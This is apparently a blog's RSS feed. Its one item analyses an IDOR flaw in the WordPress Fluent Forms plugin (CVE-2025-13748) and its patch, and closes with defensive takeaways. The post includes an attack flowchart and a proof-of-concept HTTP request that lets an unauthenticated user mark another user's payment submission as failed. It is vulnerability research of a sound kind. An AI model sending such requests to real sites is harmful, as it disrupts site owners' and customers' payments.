<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Bui Van Y</title>
    <link>http://localhost:1313/</link>
    <description>Bui Van Y</description>
    <generator>Hugo 0.153.2 &amp; FixIt v0.4.0-alpha.3-20251225101113-8ffb9a95</generator>
    <language>en</language>
    <managingEditor>w41bu1@gmail.com (Bui Van Y)</managingEditor>
    <webMaster>w41bu1@gmail.com (Bui Van Y)</webMaster>
    <lastBuildDate>Sat, 27 Dec 2025 19:00:00 +0700</lastBuildDate>
    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2025-13748 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-27-cve-2025-13748/</link>
      <pubDate>Sat, 27 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-27-cve-2025-13748/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-27-cve-2025-13748/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin &lt;strong&gt;Fluent Forms – Customizable Contact Forms, Survey, Quiz, &amp;amp; Conversational Form Builder&lt;/strong&gt; contains an &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; vulnerability in all versions &lt;strong&gt;≤ 6.1.7&lt;/strong&gt; via the &lt;code&gt;submission_id&lt;/code&gt; parameter in the SCA payment confirmation endpoint.&#xA;The vulnerability allows &lt;strong&gt;unauthenticated users&lt;/strong&gt; to &lt;strong&gt;mark other users&amp;rsquo; submissions as failed&lt;/strong&gt;, disrupting the payment process.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13748&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13748&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.1.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.1.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/fluentform/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FluentForm Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;FluentForm&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.1.7&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.1.8&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an AJAX handler &lt;strong&gt;for unauthenticated users&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_nopriv_fluentform_sca_inline_confirm_payment&amp;#39;, [$this, &amp;#39;confirmScaPayment&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; is a hook for unauthenticated users. When a request is sent to the endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with the parameter &lt;code&gt;action=fluentform_sca_inline_confirm_payment&lt;/code&gt;, the callback &lt;code&gt;confirmScaPayment&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function confirmScaPayment()&#xA;{&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $formId = isset($_REQUEST[&amp;#39;form_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;form_id&amp;#39;]) : 0;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $submissionId = isset($_REQUEST[&amp;#39;submission_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;submission_id&amp;#39;]) : 0;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $paymentMethod = isset($_REQUEST[&amp;#39;payment_method&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;payment_method&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $paymentIntentId = isset($_REQUEST[&amp;#39;payment_intent_id&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;payment_intent_id&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;&#xA;    $this-&amp;gt;setSubmissionId($submissionId);&#xA;    $submission = $this-&amp;gt;getSubmission();&#xA;    $this-&amp;gt;form = $this-&amp;gt;getForm();&#xA;&#xA;    $transaction = $this-&amp;gt;getLastTransaction($submissionId);&#xA;&#xA;    $confirmation = SCA::confirmPayment($paymentIntentId, [&#xA;        &amp;#39;payment_method&amp;#39; =&amp;gt; $paymentMethod&#xA;    ], $formId);&#xA;&#xA;    if (is_wp_error($confirmation)) {&#xA;        $message = &amp;#39;Payment has been failed. &amp;#39; . $confirmation-&amp;gt;get_error_message();&#xA;        $this-&amp;gt;handlePaymentChargeError($message, $submission, $transaction, $confirmation, &amp;#39;payment_error&amp;#39;);&#xA;    }&#xA;&#xA;    if ($confirmation-&amp;gt;status == &amp;#39;succeeded&amp;#39;) {&#xA;        $charge = $confirmation-&amp;gt;charges-&amp;gt;data[0];;&#xA;        $this-&amp;gt;handlePaymentSuccess($charge, $transaction, $submission);&#xA;    } else {&#xA;        $this-&amp;gt;handlePaymentChargeError(&amp;#39;We could not verify your payment. Please try again&amp;#39;, $submission, $transaction, $confirmation, &amp;#39;payment_error&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Inside &lt;code&gt;confirmScaPayment()&lt;/code&gt;, the plugin retrieves &lt;code&gt;submission_id&lt;/code&gt; directly from the request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$submissionId = isset($_REQUEST[&amp;#39;submission_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;submission_id&amp;#39;]) : 0;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This value:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Is not bound to the current user&lt;/li&gt;&#xA;&lt;li&gt;Has no ownership validation&lt;/li&gt;&#xA;&lt;li&gt;Is not checked for relationship with &lt;code&gt;form_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Meaning: anyone can send a request and reference any existing submission ID in the database.&lt;/p&gt;&#xA;&lt;p&gt;After retrieving &lt;code&gt;submission_id&lt;/code&gt;, the system continues:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;setSubmissionId($submissionId);&#xA;$submission = $this-&amp;gt;getSubmission();&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;This is where the core IDOR occurs: the object (submission) is accessed directly using a user-controlled ID, without any access control.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;There is no logic such as:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($submission-&amp;gt;user_id !== get_current_user_id()) {&#xA;    deny_access();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Or:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($submission-&amp;gt;form_id !== $formId) {&#xA;    deny_access();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This allows submissions belonging to other users to be manipulated by unauthenticated attackers.&lt;/p&gt;&#xA;&lt;p&gt;In the patched version, the entire request must pass strict validation:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-27-cve-2025-13748/patch.png&#34; title=&#34;Patch&#34; data-thumbnail=&#34;/posts/2025-12-27-cve-2025-13748/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-27-cve-2025-13748/patch.png&#39; alt=&#34;Patch&#34; height=&#34;447&#34; width=&#34;1875&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function validateScaRequest($submissionId, $paymentIntentId, $submission = null, $transaction = null)&#xA;{&#xA;    $strictMode = apply_filters(&amp;#39;fluentform/stripe_sca_strict_security&amp;#39;, false);&#xA;    $warnings = [];&#xA;&#xA;    // Validate nonce (optional in non-strict mode for backward compatibility)&#xA;    $nonce = isset($_REQUEST[&amp;#39;_ff_stripe_nonce&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;_ff_stripe_nonce&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;    &#xA;    if ($nonce) {&#xA;        $nonceAction = &amp;#39;fluentform_sca_confirm_&amp;#39; . $submissionId;&#xA;        if (!wp_verify_nonce($nonce, $nonceAction)) {&#xA;            $error = __(&amp;#39;Security verification failed. Invalid nonce.&amp;#39;, &amp;#39;fluentform&amp;#39;);&#xA;            if ($strictMode) {&#xA;                return new \WP_Error(&amp;#39;invalid_nonce&amp;#39;, $error);&#xA;            }&#xA;            $warnings[] = &amp;#39;Invalid nonce provided&amp;#39;;&#xA;        }&#xA;    } else {&#xA;        $warning = &amp;#39;No nonce provided for SCA payment confirmation&amp;#39;;&#xA;        if ($strictMode) {&#xA;            return new \WP_Error(&amp;#39;missing_nonce&amp;#39;, __(&amp;#39;Security verification failed. Nonce required.&amp;#39;, &amp;#39;fluentform&amp;#39;));&#xA;        }&#xA;        $warnings[] = $warning;&#xA;    }&#xA;&#xA;    // Validate submission exists&#xA;    if (!$submission || !$submission-&amp;gt;id) {&#xA;        return new \WP_Error(&amp;#39;invalid_submission&amp;#39;, __(&amp;#39;Invalid submission.&amp;#39;, &amp;#39;fluentform&amp;#39;));&#xA;    }&#xA;&#xA;    if ($submission-&amp;gt;payment_status === &amp;#39;paid&amp;#39;) {&#xA;        return new \WP_Error(&#xA;            &amp;#39;already_paid&amp;#39;,&#xA;            __(&amp;#39;This payment has already been completed and cannot be modified.&amp;#39;, &amp;#39;fluentform&amp;#39;)&#xA;        );&#xA;    }&#xA;&#xA;    // stores it in transaction.charge_id, and frontend sends it back.&#xA;    // Mismatch only occurs during attack attempts.&#xA;    if ($transaction &amp;amp;&amp;amp; $transaction-&amp;gt;charge_id) {&#xA;        if ($transaction-&amp;gt;charge_id !== $paymentIntentId) {&#xA;            return new \WP_Error(&#xA;                &amp;#39;payment_intent_mismatch&amp;#39;,&#xA;                __(&amp;#39;Payment verification failed. Payment intent does not match.&amp;#39;, &amp;#39;fluentform&amp;#39;)&#xA;            );&#xA;        }&#xA;    }&#xA;&#xA;    // Log warnings for monitoring&#xA;    if (!empty($warnings) &amp;amp;&amp;amp; defined(&amp;#39;WP_DEBUG&amp;#39;) &amp;amp;&amp;amp; WP_DEBUG) {&#xA;        $logData = [&#xA;            &amp;#39;parent_source_id&amp;#39; =&amp;gt; $submission-&amp;gt;form_id,&#xA;            &amp;#39;source_type&amp;#39;      =&amp;gt; &amp;#39;submission_item&amp;#39;,&#xA;            &amp;#39;source_id&amp;#39;        =&amp;gt; $submission-&amp;gt;id,&#xA;            &amp;#39;component&amp;#39;        =&amp;gt; &amp;#39;Payment&amp;#39;,&#xA;            &amp;#39;status&amp;#39;           =&amp;gt; &amp;#39;warning&amp;#39;,&#xA;            &amp;#39;title&amp;#39;            =&amp;gt; __(&amp;#39;Stripe SCA Security Warning&amp;#39;, &amp;#39;fluentform&amp;#39;),&#xA;            &amp;#39;description&amp;#39;      =&amp;gt; implode(&amp;#39;; &amp;#39;, $warnings)&#xA;        ];&#xA;        do_action(&amp;#39;fluentform/log_data&amp;#39;, $logData);&#xA;    }&#xA;&#xA;    return [&#xA;        &amp;#39;valid&amp;#39;    =&amp;gt; true,&#xA;        &amp;#39;warnings&amp;#39; =&amp;gt; $warnings&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;validateScaRequest&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Verifies that &lt;code&gt;submission_id&lt;/code&gt; exists and is valid&lt;/li&gt;&#xA;&lt;li&gt;Prevents processing if the submission is already paid&lt;/li&gt;&#xA;&lt;li&gt;Binds &lt;code&gt;payment_intent_id&lt;/code&gt; to the corresponding transaction&lt;/li&gt;&#xA;&lt;li&gt;Prevents forged payment intents&lt;/li&gt;&#xA;&lt;li&gt;Adds nonce verification&lt;/li&gt;&#xA;&lt;li&gt;Logs abnormal behavior&lt;/li&gt;&#xA;&lt;li&gt;Fully blocks unauthorized submission state manipulation&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;This effectively eliminates the IDOR vulnerability.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Send request to admin-ajax.php?action=fluentform_sca_inline_confirm_payment&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Extract submission_id &amp;amp; payment_intent_id from request&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;No nonce validation&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Load submission by submission_id&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;No ownership or relationship check&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Load transaction using submission_id&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;No validation between payment_intent_id and transaction&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Process payment confirmation&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;Update submission status (success / failed)&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Attacker manipulates victim&amp;#39;s submission&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Send request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: victim.com&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;action=fluentform_sca_inline_confirm_payment&#xA;&amp;amp;submission_id=1024&#xA;&amp;amp;payment_method=card&#xA;&amp;amp;payment_intent_id=pi_fake&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The CVE-2025-13748 vulnerability stems from &lt;strong&gt;trusting client-controlled input&lt;/strong&gt;, specifically &lt;code&gt;submission_id&lt;/code&gt;, without any ownership or context validation. The payment confirmation endpoint is exposed to unauthenticated users and allows direct manipulation of submissions without binding them to a legitimate user, form, or transaction.&lt;/p&gt;&#xA;&lt;p&gt;The lack of ownership checks, missing linkage between &lt;code&gt;payment_intent_id&lt;/code&gt; and transaction, and absence of request authentication collectively enable attackers to &lt;strong&gt;manipulate other users’ payment states&lt;/strong&gt;. This is a textbook case of &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; caused by flawed business logic rather than a low-level technical bug.&lt;/p&gt;&#xA;&lt;p&gt;The patch fully resolves the issue by introducing layered validation, strict checks, and contextual binding, eliminating the attack surface.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never trust client-supplied data, even in internal payment flows.&lt;/li&gt;&#xA;&lt;li&gt;IDOR vulnerabilities often stem from missing ownership validation, not missing input sanitization.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; endpoints must be strictly protected as they are accessible to everyone.&lt;/li&gt;&#xA;&lt;li&gt;Payment flows must tightly bind &lt;strong&gt;submission – transaction – payment intent&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Always validate both &lt;strong&gt;request origin&lt;/strong&gt; and &lt;strong&gt;business context&lt;/strong&gt;, not just data format.&lt;/li&gt;&#xA;&lt;li&gt;Defense-in-depth is the only effective way to prevent IDOR.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 